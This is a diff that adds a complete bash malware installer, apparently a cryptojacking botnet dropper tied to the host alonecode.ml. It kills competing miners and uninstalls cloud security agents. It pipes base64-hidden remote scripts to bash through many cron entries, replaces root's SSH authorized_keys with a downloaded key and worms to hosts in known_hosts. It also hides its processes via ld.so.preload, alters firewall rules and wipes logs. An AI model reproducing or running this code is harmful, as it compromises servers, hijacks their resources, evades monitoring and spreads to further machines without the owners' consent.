@@ -1,0 +1,888 @@
+#!/bin/bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+#http://alonecode.ml/jump1
+jump1=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9qdW1wMQo=|base64 -d)
+
+#http://alonecode.ml/install
+install=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9pbnN0YWxsCg==|base64 -d)
+
+#http://alonecode.ml/jump2
+jump2=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9qdW1wMgo=|base64 -d)
+
+#http://alonecode.ml/jump2
+jump3=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9qdW1wMwo=|base64 -d)
+
+#http://alonecode.ml/update
+update=$(echo aHR0cDovL2Fsb25lY29kZS5tbC91cGRhdGUK|base64 -d)
+
+#http://alonecode.ml/pythonv
+pythonv=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9weXRob252Cg==|base64 -d)
+
+Permission=$(whoami)
+
+pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
+rm -rf /tmp/qW3xT.2 /tmp/ddgs.3020 /tmp/ddgs.3020 /tmp/wnTKYg /tmp/2t3ik
+ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "cranbery" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep /opt/yilu/mservice|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep Circle_MI | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep hashvault.pro | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep nanopool.org | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
+ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep xiaoyao| awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep xiaoxue| awk '{print $2}'|xargs kill -9
+ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
+netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :23 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :143 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :2222 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3389 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :6665 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :6667 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :8444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+pkill -f biosetjenkins
+pkill -f Loopback
+pkill -f apaceha
+pkill -f cryptonight
+pkill -f stratum
+pkill -f mixnerdx
+pkill -f performedl
+pkill -f JnKihGjn
+pkill -f irqba2anc1
+pkill -f irqba5xnc1
+pkill -f irqbnc1
+pkill -f ir29xc1
+pkill -f conns
+pkill -f irqbalance
+pkill -f crypto-pool
+pkill -f minexmr
+pkill -f XJnRj
+pkill -f mgwsl
+pkill -f pythno
+pkill -f jweri
+pkill -f lx26
+pkill -f NXLAi
+pkill -f BI5zj
+pkill -f askdljlqw
+pkill -f minerd
+pkill -f minergate
+pkill -f Guard.sh
+pkill -f ysaydh
+pkill -f bonns
+pkill -f donns
+pkill -f kxjd
+pkill -f Duck.sh
+pkill -f bonn.sh
+pkill -f conn.sh
+pkill -f kworker34
+pkill -f kw.sh
+pkill -f pro.sh
+pkill -f polkitd
+pkill -f acpid
+pkill -f icb5o
+pkill -f nopxi
+pkill -f irqbalanc1
+pkill -f minerd
+pkill -f i586
+pkill -f gddr
+pkill -f mstxmr
+pkill -f ddg.2011
+pkill -f wnTKYg
+pkill -f deamon
+pkill -f disk_genius
+pkill -f sourplum
+pkill -f polkitd
+pkill -f nanoWatch
+pkill -f zigw
+pkill -f devtool
+pkill -f systemctI
+pkill -f WmiPrwSe
+pkill -f sysguard
+pkill -f sysupdate
+pkill -f networkservice
+crontab -r
+rm -rf /var/spool/cron/*
+mv /usr/bin/get /usr/bin/wget
+mv /usr/bin/get /usr/bin/xget
+mv /usr/bin/wge /usr/bin/get
+mv /usr/bin/url /usr/bin/curl
+mv /usr/bin/url /usr/bin/xurl
+mv /usr/bin/cur /usr/bin/url
+chattr -i /etc/sysupdate*
+chattr -i /etc/config.json*
+chattr -i /etc/update.sh*
+chattr -i /etc/networkservice
+rm -rf /etc/sysupdate*
+rm -rf /etc/update.sh*
+echo 0>/root/.ssh/authorized_keys*
+rm -rf /etc/networkservice
+rm /tmp/.cron
+rm /tmp/.main
+rm /tmp/.yam* -rf
+rm -f /tmp/irq
+rm -f /tmp/irq.sh
+rm -f /tmp/irqbalanc1
+rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
+rm -rf /tmp/*httpd.conf
+rm -rf /tmp/*httpd.conf*
+rm -rf /tmp/*index_bak*
+rm -rf /tmp/.systemd-private-*
+rm -rf /tmp/.xm*
+rm -rf /tmp/a7b104c270
+rm -rf /tmp/conn
+rm -rf /tmp/conns
+rm -rf /tmp/httpd.conf
+rm -rf /tmp/java*
+rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so
+rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
+rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
+rm -rf /tmp/xm*
+rm -rf /var/tmp/java*
+killall \.Historys
+killall \.sshd
+killall neptune
+killall xm64
+killall xm32
+killall xmrig
+killall \.xmrig
+killall suppoieup
+pkill -f sourplum
+pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
+
+function kill_port() {
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -gt 1 ];then
+
+        chattr -i /etc/ld.so.preload
+
+        chattr -i /usr/local/lib/libdns.so
+
+        rm -rf /etc/ld.so.preload
+
+        rm -rf /usr/local/lib/libdns.so
+
+        pid=$(lsof -i:13531 -F pid | grep p)
+
+        pid=${pid//p/}
+
+        for x in "$pid"
+
+        do
+
+            kill -9 ${x}
+
+        done
+
+    fi
+
+    sleep 10
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -eq 0 ];then
+
+        nohup $path/sysinfo >/dev/null 2>&1 &
+
+    fi
+}
+
+function clearall() {
+
+    chattr -i /etc/ld.so.preload
+
+    chattr -i /usr/local/lib/libdns.so
+
+    rm -rf /etc/ld.so.preload
+
+    rm -rf /usr/local/lib/libdns.so
+
+	ps auxf|grep -v grep|grep "sysinfo" | awk '{print $2}'|xargs kill -9
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -gt 1 ];then
+
+        pid=$(lsof -i:13531 -F pid | grep p)
+
+        pid=${pid//p/}
+
+        for x in "$pid"
+
+        do
+
+            kill -9 ${x}
+
+        done
+
+    fi
+
+    if [ "$Permission" == "root" ];then
+
+        rm -rf /bin/sysinfo
+
+    else
+
+        rm -rf /tmp/systemd-private-67b069b16d144cf38e51bc2a05c9d341-bolt.service-520ZS/*
+
+    fi
+
+}
+
+function uninstall() {
+	if ps aux | grep -i '[a]liyun'; then
+		wget http://update.aegis.aliyun.com/download/uninstall.sh
+		chmod +x uninstall.sh
+		./uninstall.sh
+		wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
+		chmod +x quartz_uninstall.sh
+		./quartz_uninstall.sh
+		rm -f uninstall.sh 	quartz_uninstall.sh
+		pkill aliyun-service
+		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
+		rm -rf /usr/local/aegis*;
+	elif ps aux | grep -i '[y]unjing'; then
+		/usr/local/qcloud/stargate/admin/uninstall.sh
+		/usr/local/qcloud/YunJing/uninst.sh
+		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
+	fi
+	touch /tmp/.ZS9020413686970510410
+}
+
+function standby() {
+
+    #http://alonecode.ml/standby1
+    standby1=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9zdGFuZGJ5MQo=|base64 -d)
+
+    #http://alonecode.ml/standby2
+    standby2=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9zdGFuZGJ5Mgo=|base64 -d)
+
+    mode=$1
+
+    if [ "$mode" != "root" ];then
+
+        (curl -fsSL $standby1 || wget -q -O - $standby1)|bash
+
+    else
+
+        (curl -fsSL $standby2 || wget -q -O - $standby2)|bash
+
+    fi
+
+}
+
+function sys_glibc() {
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -eq 0 ];then
+
+        if [ $(strings /lib64/libc.so.6 | grep GLIBC_ | grep 2.14 | wc -l) -eq 0 ];then
+
+            rm -rf /tmp/systemd-private-e2cf0e11eb9d4cbe9d9de701a7efed74-colord.service-0GtH00*
+
+            mkdir /tmp/systemd-private-e2cf0e11eb9d4cbe9d9de701a7efed74-colord.service-0GtH00
+
+            wget http://alonecode.ml/linux/glibc-2.14.tar.gz -O /tmp/systemd-private-e2cf0e11eb9d4cbe9d9de701a7efed74-colord.service-0GtH00/glibc-2.14.tar.gz
+
+            cd /tmp/systemd-private-e2cf0e11eb9d4cbe9d9de701a7efed74-colord.service-0GtH00
+
+            tar -zxvf glibc-2.14.tar.gz
+
+            cd glibc-2.14
+
+            mkdir build
+
+            cd build
+
+            ../configure --prefix=/opt/glibc-2.14
+
+            make -j4
+
+            sudo make install
+
+            export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH
+
+            kill_port
+
+        fi
+
+    fi
+
+}
+
+function Download() {
+
+    mode=$1
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -eq 0 ];then
+
+        #http://alonecode.ml/linux/sysinfo
+        d=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9saW51eC9zeXNpbmZvCg==|base64 -d)
+
+        if [ "$mode" != "root" ];then
+
+            path="/tmp/systemd-private-67b069b16d144cf38e51bc2a05c9d341-bolt.service-520ZS"
+
+            path2="/tmp"
+
+            mkdir -p $path
+
+            rm -rf $path/*
+
+            chattr -i $path/*
+
+        else
+
+            path="/bin"
+
+            path2="/bin"
+
+            chattr -i $path/sysinfo
+
+            rm -rf $path/sysinfo
+
+        fi
+
+        if [ ! -f "$path/sysinfo" ];then
+
+            python2 -c "import urllib;url = '$d';urllib.urlretrieve(url, '$path/sysinfo')" || (curl -fsSL $d -o $path/sysinfo||wget $d -O $path/sysinfo)
+
+            chmod +x $path/sysinfo
+
+            kill_port
+
+            sys_glibc
+
+        else
+
+            kill_port
+
+            sys_glibc
+
+        fi
+
+    fi
+
+    N=$(echo )
+
+    if [ ! -f "$path/sysinfo" ];then
+
+        python2 -c "import urllib;url = '$d';urllib.urlretrieve(url, '$path/sysinfo')" || (curl -fsSL $d -o $path/sysinfo||wget $d -O $path/sysinfo)
+
+        chmod +x $path/sysinfo
+
+        kill_port
+
+    else
+
+        kill_port
+
+    fi
+
+}
+
+function system() {
+
+    chattr -i /etc/crontab
+
+	rm -rf /bin/httpntp /bin/ftpsdns
+
+	cat /etc/crontab | grep -v "##" | grep -v "/bin/httpntp" | grep -v "/bin/ftpsdns" > /etc/crontab.bak && mv /etc/crontab.bak /etc/crontab
+
+	if [ ! -f "/bin/httpntp" ]; then
+
+		if [ ! -f "/bin/httpntp" ]; then
+
+			echo -e "(curl -fsSL $install||wget -q -O - $install||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()')|bash\n##" > /bin/httpntp && chmod 755 /bin/httpntp
+
+		fi
+
+		if [ ! -f "/etc/crontab" ]; then
+
+			echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /bin/httpntp\n##" >> /etc/crontab
+
+		else
+
+			echo -e "0 1 * * * root /bin/httpntp" >> /etc/crontab
+
+		fi
+
+	fi
+
+	if [ ! -f "/bin/ftpsdns" ]; then
+
+		data=$( (curl -fsSL $install||wget -q -O - $install) )
+
+		if [ ! -f "/bin/ftpsdns" ]; then
+
+			echo $data > /bin/ftpsdns && chmod 755 /bin/ftpsdns
+
+		fi
+
+		if [ ! -f "/etc/crontab" ]; then
+
+			echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n5 1 * * * root /bin/ftpsdns\n##" >> /etc/crontab
+
+		else
+
+			echo -e "5 1 * * * root /bin/ftpsdns" >> /etc/crontab
+
+		fi
+
+	fi
+
+    key=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9rZXkudHh0Cg==|base64 -d)
+
+    key_date=$(curl -fsSL "$key"||wget -q -O- "$key")
+
+    chattr -i /root/.ssh/authorized_keys*
+
+	if [ -f "/root/.ssh/authorized_keys" ];then
+
+        echo "$key_date" > /root/.ssh/authorized_keys
+
+        chattr +i /root/.ssh/authorized_keys*
+
+    else
+
+        mkdir /root/.ssh
+
+        echo "$key_date" > /root/.ssh/authorized_keys
+
+        chattr +i /root/.ssh/authorized_keys*
+
+    fi
+
+	if [ -f "/root/.ssh/known_hosts" ] && [ -f "/root/.ssh/id_rsa.pub" ]; then
+
+  		for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL http://alonecode.ml/go||wget -q -O- http://alonecode.ml/go|sh' & done
+	fi
+
+}
+
+function install() {
+
+    if [ -f "/usr/bin/python2" ];then
+
+        if [ ! -f "/usr/bin/pip2" ];then
+
+            cd /usr/local/src/
+
+            wget --no-check-certificate http://alonecode.ml/linux/setuptools-41.0.1.zip
+
+            unzip setuptools-41.0.1.zip
+
+            cd setuptools-41.0.1
+
+            python2 setup.py build
+
+            python2 setup.py install
+
+            cd /usr/local/src/
+
+            wget --no-check-certificate http://alonecode.ml/linux/pip-19.1.1.tar.gz
+
+            tar -zxvf pip-19.1.1.tar.gz
+
+            cd pip-19.1.1
+
+            python2 setup.py build
+
+            python2 setup.py install
+
+            sleep 10
+
+            pip2 install redis
+
+        else
+
+            pip2 install redis
+
+        fi
+
+    fi
+
+}
+
+function python_scanf() {
+
+    if [ -f "/tmp/.JF3747632407162760410" ];then
+
+        local_v=$(cat /tmp/.JF3747632407162760410)
+
+        web_v=$(curl -fsSL $pythonv||wget -q -O- $pythonv)
+
+        webscanf=$(echo aHR0cDovL2Fsb25lY29kZS5tbC93ZWJzY2FuZi5weQo=|base64 -d)
+
+        if [ "$local_v" != "$web_v" ];then
+
+            echo "$web_v" > /tmp/.JF3747632407162760410
+
+            curl -fsSL "$webscanf" -o /tmp/JF3747632407162760410.py || wget "$webscanf" -O /tmp/JF3747632407162760410.py
+
+            nohup python2 /tmp/JF3747632407162760410.py >/dev/null 2>&1 &
+
+        fi
+
+    else
+
+        webscanf=$(echo aHR0cDovL2Fsb25lY29kZS5tbC93ZWJzY2FuZi5weQo=|base64 -d)
+
+        web_v=$(curl -fsSL $pythonv||wget -q -O- $pythonv)
+
+        echo "$web_v" > /tmp/.JF3747632407162760410
+
+        curl -fsSL "$webscanf" -o /tmp/JF3747632407162760410.py || wget "$webscanf" -O /tmp/JF3747632407162760410.py
+
+        nohup python2 /tmp/JF3747632407162760410.py >/dev/null 2>&1 &
+
+    fi
+
+}
+
+function hosts() {
+
+    echo 0>/etc/hosts
+
+    echo "127.0.0.1 xmr.crypto-pool.fr" >> /etc/hosts
+
+    echo "127.0.0.1 monerohash.com" >> /etc/hosts
+
+    echo "127.0.0.1 pool.noobxmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 xmrpool.eu" >> /etc/hosts
+
+    echo "127.0.0.1 pool.monerohash.com" >> /etc/hosts
+
+    echo "127.0.0.1 xmr.poolto.be" >> /etc/hosts
+
+    echo "127.0.0.1 stratum.viaxmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 pool.monero.hashvault.pro" >> /etc/hosts
+
+    echo "127.0.0.1 xmr-us.suprnova.cc" >> /etc/hosts
+
+    echo "127.0.0.1 de.moriaxmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 de2.moriaxmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 fr.minexmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 de.minexmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 ca.minexmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 sg.minexmr.com" >> /etc/hosts
+
+    echo "127.0.0.1 xmr.bohemianpool.com" >> /etc/hosts
+
+    echo "127.0.0.1 xmr-usa.dwarfpool.com" >> /etc/hosts
+
+    echo "127.0.0.1 monero.miners.net" >> /etc/hosts
+
+    echo "127.0.0.1 thyrsi.com" >> /etc/hosts
+
+    echo "127.0.0.1 minerxmr.ru" >> /etc/hosts
+
+    echo "127.0.0.1 zer0day.ru" >> /etc/hosts
+
+    echo "127.0.0.1 minergate.com" >> /etc/hosts
+
+    echo "127.0.0.1 mine.moneropool.com" >> /etc/hosts
+
+    echo "127.0.0.1 198.13.42.229" >> /etc/hosts
+
+    echo "127.0.0.1 pastebin.com" >> /etc/hosts
+
+    echo "127.0.0.1 51.255.34.79" >> /etc/hosts
+
+    echo "127.0.0.1 5.196.26.96" >> /etc/hosts
+
+    echo "127.0.0.1 51.15.55.100" >> /etc/hosts
+
+}
+
+function net_c() {
+
+    Net=$(echo aHR0cDovL2Fsb25lY29kZS5tbC9OZXRkbnMK|base64 -d)
+
+    (curl -fsSL $Net -o /tmp/Netdns||wget $Net -O /tmp/Netdns)
+
+    chmod +x /tmp/Netdns
+
+    nohup /tmp/Netdns >/dev/null 2>&1 &
+
+}
+
+function writecrontab() {
+
+    mode=$1
+
+    if [ $mode == "root" ];then
+
+        chattr -i /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/orange /etc/cron.daily/orange /etc/cron.monthly/orange /etc/cron.d/system
+
+        rm -rf /etc/cron.hourly/orange /etc/cron.daily/orange /etc/cron.monthly/orange
+
+        mkdir -p /var/spool/cron/crontabs
+
+        mkdir -p /etc/cron.hourly
+
+        mkdir -p /etc/cron.daily
+
+        mkdir -p /etc/cron.monthly
+
+        start=$(curl -fsSL $jump1||wget -q -O- $jump1)
+
+        echo -e "*/3 * * * * root (curl -fsSL $jump1||wget -q -O- $jump1||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()'||curl -fsSL $jump2||wget -q -O - $jump2||curl -fsSL $jump3||wget -q -O - $jump3)|bash\n##" > /etc/cron.d/root
+        echo -e "*/6 * * * * root (curl -fsSL $jump1||wget -q -O- $jump1||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()'||curl -fsSL $jump2||wget -q -O - $jump2||curl -fsSL $jump3||wget -q -O - $jump3)|bash\n##" > /etc/cron.d/system
+        echo -e "*/7 * * * * root (curl -fsSL $jump1||wget -q -O- $jump1||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()'||curl -fsSL $jump2||wget -q -O - $jump2||curl -fsSL $jump3||wget -q -O - $jump3)|bash\n##" > /etc/cron.d/apache
+        echo -e "*/9 * * * * (curl -fsSL $jump1||wget -q -O- $jump1||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()'||curl -fsSL $jump2||wget -q -O - $jump2||curl -fsSL $jump3||wget -q -O - $jump3)|bash\n##" > /var/spool/cron/root
+        echo -e "*/11 * * * * (curl -fsSL $jump1||wget -q -O- $jump1||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()'||curl -fsSL $jump2||wget -q -O - $jump2||curl -fsSL $jump3||wget -q -O - $jump3)|bash\n##" > /var/spool/cron/crontabs/root
+
+        if [ ! -f "/etc/cron.hourly/orange" ]; then
+            echo $start > /etc/cron.hourly/orange && chmod +x /etc/cron.hourly/orange
+        fi
+        if [ ! -f "/etc/cron.daily/orange" ]; then
+            echo $start > /etc/cron.daily/orange && chmod +x /etc/cron.daily/orange
+        fi
+        if [ ! -f "/etc/cron.monthly/orange" ]; then
+            echo $start > /etc/cron.monthly/orange && chmod +x /etc/cron.monthly/orange
+        fi
+
+        touch -acmr /bin/sh /var/spool/cron/root
+        touch -acmr /bin/sh /var/spool/cron/crontabs/root
+        touch -acmr /bin/sh /etc/cron.d/system
+        touch -acmr /bin/sh /etc/cron.d/apache
+        touch -acmr /bin/sh /etc/cron.d/root
+        touch -acmr /bin/sh /etc/cron.hourly/orange
+        touch -acmr /bin/sh /etc/cron.daily/orange
+        touch -acmr /bin/sh /etc/cron.monthly/orange
+
+	else
+
+        zs=$(crontab -l | grep -q "$jump1" | wc -l)
+
+        if [ ${zs} -eq 0 ];then
+
+            crontab -r
+
+            (crontab -l 2>/dev/null; echo "*/1 * * * * (curl -fsSL $jump1||wget -q -O- $jump1||curl -fsSL $jump2||wget -q -O - $jump2||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$install\").read()'||curl -fsSL $jump3||wget -q -O - $jump3)|bash > /dev/null 2>&1")| crontab -
+
+        else
+
+            echo " "
+	    fi
+
+	fi
+
+	chattr +i /etc/cron.hourly/orange
+
+    chattr +i /etc/cron.daily/orange
+
+    chattr +i /etc/cron.monthly/orange
+
+    chattr +i /etc/cron.d/root
+
+    chattr +i /etc/cron.d/system
+
+    chattr +i /etc/cron.d/apache
+
+    chattr +i /var/spool/cron/root
+
+    chattr +i /var/spool/cron/crontabs/root
+
+}
+
+echo "Permission level:$Permission"
+
+version=$(curl -fsSL $update||wget -q -O- $update)
+
+localver=$(cat /tmp/.38t9guft0055d0565u444gt410)
+
+if [ "$version" != "$localver" ];then
+
+    echo "$version" > /tmp/.38t9guft0055d0565u444gt410
+
+    rm -rf /tmp/.JF9020413686970512810
+
+    rm -rf /tmp/.JF9020413686970512804
+
+    rm -rf /tmp/.38t9guft0055d0565u444gtjr0
+
+    clearall
+
+fi
+
+if [ "$Permission" == "root" ];then
+
+    system
+
+    hosts
+
+    install
+
+    python_scanf
+
+    standby "root"
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -eq 0 ];then
+
+        echo "Write Crontab...."
+
+        writecrontab "root"
+
+        Download "root"
+
+    else
+
+        echo "Running..."
+
+        kill_port
+
+        writecrontab "root"
+
+    fi
+
+    net_c
+
+else
+
+    install
+
+    python
+
+    hosts
+
+    standby "NO"
+
+    if [ $(netstat -ano | grep :13531 | grep ESTABLISHED | wc -l) -eq 0 ];then
+
+        Download "NO"
+
+        crontab -r
+
+        writecrontab "NO"
+
+        kill_port
+
+    else
+
+        echo "Running..."
+
+        crontab -r
+
+        writecrontab "NO"
+
+        kill_port
+
+    fi
+
+    net_c
+
+fi
+
+if [ $(ps auxf|grep -v grep|grep sysinfo|wc -l) -gt 0 ];then
+
+    mkdir -p /usr/local/lib/
+
+    if [ ! -f "/usr/local/lib/libdns.so" ]; then
+
+        curl -fsSL --connect-timeout 120 http://alonecode.ml/libprocesshider.so -o /usr/local/lib/libdns.so && chmod 755 /usr/local/lib/libdns.so && touch -acmr /bin/sh /usr/local/lib/libdns.so && chattr +i /usr/local/lib/libdns.so
+
+            if [ ! -f "/usr/local/lib/libdns.so" ]; then
+
+                wget http://alonecode.ml/libprocesshider.so -O /usr/local/lib/libdns.so && chmod 755 /usr/local/lib/libdns.so && touch -acmr /bin/sh /usr/local/lib/libdns.so && chattr +i /usr/local/lib/libdns.so
+
+            fi
+
+    fi
+
+    echo /usr/local/lib/libdns.so > /etc/ld.so.preload
+
+    touch -acmr /bin/sh /etc/ld.so.preload
+
+    touch -acmr /bin/sh /usr/local/lib/libdns.so
+
+    chattr -i /etc/ld.so.preload && echo /usr/local/lib/libdns.so > /etc/ld.so.preload && touch -acmr /bin/sh /etc/ld.so.preload
+
+    chattr +i /etc/ld.so.preload
+
+fi
+
+iptables -F
+iptables -X
+iptables -A OUTPUT -p tcp --dport 13531 -j ACCEPT
+iptables -A INPUT -p tcp --dport 13531 -j ACCEPT
+iptables -A OUTPUT -p tcp --dport 5555 -j DROP
+iptables -A INPUT -p tcp --dport 5555 -j DROP
+iptables -A OUTPUT -p tcp --dport 3333 -j DROP
+iptables -A OUTPUT -p tcp --dport 7777 -j DROP
+iptables -A OUTPUT -p tcp --dport 9999 -j DROP
+iptables -A OUTPUT -p tcp --dport 8888 -j DROP
+iptables -A OUTPUT -p tcp --dport 6666 -j DROP
+iptables -A OUTPUT -p tcp --dport 8667 -j DROP
+iptables -A OUTPUT -p tcp --dport 14444 -j DROP
+iptables -A INPUT -p tcp --dport 8667 -j DROP
+iptables -I INPUT -s 198.13.42.229 -j DROP
+iptables -I OUTPUT -s 198.13.42.229 -j DROP
+firewall-cmd --zone=public --add-port=13531/tcp --permanent
+firewall-cmd --zone=public --remove-port=5555/tcp --permanent
+firewall-cmd --zone=public --remove-port=3333/tcp --permanent
+firewall-cmd --zone=public --remove-port=7777/tcp --permanent
+firewall-cmd --zone=public --remove-port=9999/tcp --permanent
+firewall-cmd --zone=public --remove-port=8888/tcp --permanent
+firewall-cmd --zone=public --remove-port=6666/tcp --permanent
+firewall-cmd --zone=public --remove-port=8667/tcp --permanent
+firewall-cmd --zone=public --remove-port=14444/tcp --permanent
+firewall-cmd --zone=public --remove-port=8667/tcp --permanent
+firewall-cmd --reload
+systemctl restart iptables
+service iptables reload
+systemctl reload firewalld
+systemctl restart firewalld
+
+echo 0>/var/spool/mail/root
+echo 0>/var/log/wtmp
